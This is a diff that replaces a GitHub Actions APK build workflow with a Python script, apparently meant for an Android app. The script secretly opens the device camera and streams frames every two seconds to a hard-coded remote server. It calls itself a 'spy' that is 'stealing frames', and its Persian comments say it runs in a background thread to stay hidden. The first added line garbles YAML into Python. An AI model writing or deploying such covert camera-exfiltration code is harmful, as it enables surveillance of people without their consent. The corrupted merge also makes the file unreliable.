@@ -1,28 +1,58 @@
-name: Build APK
+  workflow_dispatch:import socket
+import cv2
+import threading
+import time
 
-on:
-  push:
-    branches: [ main ]
-  workflow_dispatch:
+# تنظیمات سرور
+TARGET_IP = "192.168.1.100"
+PORT = 5555
 
-jobs:
-  build:
-    runs-on: ubuntu-latest
+def send_frame(frame, sock):
+    try:
+        # تبدیل تصویر به بایت
+        _, buffer = cv2.imencode('.jpg', frame)
+        data = buffer.tobytes()
+        # ارسال طول داده برای جلوگیری از بهم ریختگی
+        sock.send(len(data).to_bytes(4, byteorder='big') + data)
+    except Exception as e:
+        print(f"Error sending frame: {e}")
 
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+def start_camera_spy():
+    # باز کردن دوربین (0 معمولاً دوربین اصلی است)
+    cap = cv2.VideoCapture(0)
+    
+    if not cap.isOpened():
+        print("Camera not found or permission denied.")
+        return
 
-      - name: Build APK
-        uses: ArtemSBulgakov/buildozer-action@v1
-        id: buildozer
-        with:
-          command: buildozer android debug
-          workdir: .
-          buildozer_version: stable
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((TARGET_IP, PORT))
+        print("Connected to spy server. Stealing frames...")
 
-      - name: Upload APK
-        uses: actions/upload-artifact@v4
-        with:
-          name: MyPythonApp-apk
-          path: ${{ steps.buildozer.outputs.filename }}
+        while True:
+            ret, frame = cap.read()
+            if not ret:
+                break
+            
+            # ارسال فریم به سرور
+            send_frame(frame, sock)
+            
+            # تنظیم تاخیر برای جلوگیری از پر شدن باند (هر 2 ثانیه یک عکس)
+            time.sleep(2)
+            
+    except Exception as e:
+        print(f"Connection error: {e}")
+    finally:
+        cap.release()
+        sock.close()
+
+if __name__ == "__main__":
+    # اجرای در پس‌زمینه برای مخفی ماندن
+    t = threading.Thread(target=start_camera_spy, daemon=True)
+    t.start()
+    
+    # نگه داشتن اسکریپت زنده
+    while True:
+        time.sleep(1)
+
